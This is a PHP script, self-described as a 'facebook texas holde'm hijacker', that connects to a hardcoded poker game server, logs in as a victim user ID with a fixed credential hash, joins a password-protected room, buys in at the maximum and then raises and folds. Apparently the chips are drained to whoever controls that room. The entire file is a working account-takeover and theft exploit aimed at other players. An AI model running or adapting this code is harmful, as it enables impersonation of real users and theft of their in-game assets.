<?php

//facebook texas holde'm hijacker by ben

error_reporting(E_ALL);

if($argc<2)
    $victim = "514410625";
else
    $victim = $argv[1];

$room_no = 4101;
$room_pass = "caca";
$maxbuyin = 400;
$raise = 200;
$timer = 4;

function read_response($socket, $banner) {
    echo "\n";
    while(ord($data = socket_read($socket,1,PHP_NORMAL_READ))) {
        if(!$banner) echo $data;
    } 
    echo $banner;
}

$data = array( "<msg t='sys'><body action='verChk' r='0'><ver v='142' /></body></msg>\0",
                "<msg t='sys'><body action='rndK' r='-1'></body></msg>\0",
                "<msg t='sys'><body action='login' r='0'><login z='TexasHoldemUp'><nick>
                    <![CDATA[1:".$victim."]]></nick><pword><![CDATA[e908cbf8bf26b5e9fb88953414e380e4:1227079052]]></pword></login></body></msg>\0",
                "<msg t='sys'><body action='getRmList' r='-1'></body></msg>\0",
                "<msg t='sys'><body action='autoJoin' r='-1'></body></msg>\0",
                "<msg t='xt'><body action='xtReq' r='1'><![CDATA[<dataObj><var n='name' t='s'>texasLogin</var>
                    <var n='cmd' t='s'>displayRoomList</var><obj t='o' o='param'></obj></dataObj>]]></body></msg>\0",
                "<msg t='xt'><body action='xtReq' r='1'><![CDATA[<dataObj><var n='name' t='s'>texasLogin</var>
                    <var n='cmd' t='s'>setUserProps</var><obj t='o' o='param'><var n='pic_url' t='s'>
                    http://profile.ak.facebook.com/profile6/1804/96/ba4375603_246.jpg</var><var n='rank' t='n'>100</var>
                    <var n='network' t='s'>B, </var><var n='pic_lrg_url' t='s'>
                    http://profile.ak.facebook.com/profile6/1804/96/x247324603_9175.jpg</var></obj></dataObj>]]></body></msg>\0",
                "<msg t='sys'><body action='setBvars' r='-1'><vars><var n='status'><![CDATA[Lobby]]></var>
                    <var n='points'><![CDATA[100]]></var><var n='fullname'><![CDATA[DXT]]></var></vars></body></msg>\0",
                "<msg t='sys'><body action='joinRoom' r='1'><room id='".$room_no."' pwd='".$room_pass."' spec='0' leave='1' old='1' /></body></msg>\0",
                "<msg t='xt'><body action='xtReq' r='".$room_no."'><![CDATA[<dataObj><var n='name' t='s'>gameRoom</var>
                    <var n='cmd' t='s'>sit</var><obj t='o' o='param'><var n='sitNo' t='n'>4</var>
                    <var n='buyIn' t='n'>".$maxbuyin."</var><var n='_cmd' t='s'>sit</var></obj></dataObj>]]></body></msg>\0");

//Wynn
$address = '216.151.149.36';
$service_port = 9339;

/* Create a TCP/IP socket. */
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false)
    echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";

echo "Connecting...\n\n";
$result = socket_connect($socket, $address, $service_port);
if ($result === false)
    echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";

//FIRST
read_response($socket, NULL);

//AUTH
echo "\n\n::[  Auth  ]::\n";
for($i=0;$i<3;$i++) {
    echo "\n::[".$i."]::";
    socket_write($socket, $data[$i]);
    read_response($socket, NULL);
}

//ROOM LIST
echo "\n\n::[  RMLIST  ]::\n";
socket_write($socket, $data[3]);
read_response($socket, "ROOM LIST DOWNLOADED...");

//AUTOJOIN
echo "\n\n::[  AUTOJOIN  ]::\n";
socket_write($socket, $data[4]);
read_response($socket, NULL);

//TEXAS LOGIN
echo "\n\n::[  TEXAS LOGIN ]::\n";
socket_write($socket, $data[5]);
socket_write($socket, $data[6]);
socket_write($socket, $data[7]);
read_response($socket, NULL);
read_response($socket, "\nROOM LIST DOWNLOADED...");

//JOIN ROOM
echo "\n\n::[  JOINING ROOM  ]::\n";
socket_write($socket, $data[8]);
read_response($socket, NULL);

//SIT
echo "\n\n::[  SITTING  ]::\n";
socket_write($socket, $data[9]);
read_response($socket, NULL);

//FOLD first one
echo "\n\n::[  GAME  ]::\n";
sleep($timer+2);
socket_write($socket, "<msg t='xt'><body action='xtReq' r='".$room_no."'><![CDATA[<dataObj><var n='name' t='s'>gameRoom</var>
                        <var n='cmd' t='s'>act</var><obj t='o' o='param'><var n='action' t='s'>f</var><var n='chips' t='n'>-1</var>
                        <var n='_cmd' t='s'>act</var></obj></dataObj>]]></body></msg>\0");
read_response($socket, NULL);

//RAISE second one
sleep($timer);
socket_write($socket, "<msg t='xt'><body action='xtReq' r='".$room_no."'><![CDATA[<dataObj><var n='name' t='s'>gameRoom</var><var n='cmd' t='s'>act</var><obj t='o' o='param'><var n='action' t='s'>r</var><var n='chips' t='n'>".$raise."</var><var n='_cmd' t='s'>act</var></obj></dataObj>]]></body></msg>\0");
read_response($socket, NULL);

//AND fold ;)
sleep($timer);
socket_write($socket, "<msg t='xt'><body action='xtReq' r='".$room_no."'><![CDATA[<dataObj><var n='name' t='s'>gameRoom</var>
                        <var n='cmd' t='s'>act</var><obj t='o' o='param'><var n='action' t='s'>f</var><var n='chips' t='n'>-1</var>
                        <var n='_cmd' t='s'>act</var></obj></dataObj>]]></body></msg>\0");
read_response($socket, NULL);

//BYE
sleep($timer);
echo "\n\nClosing connection...\n";
socket_close($socket);
?>
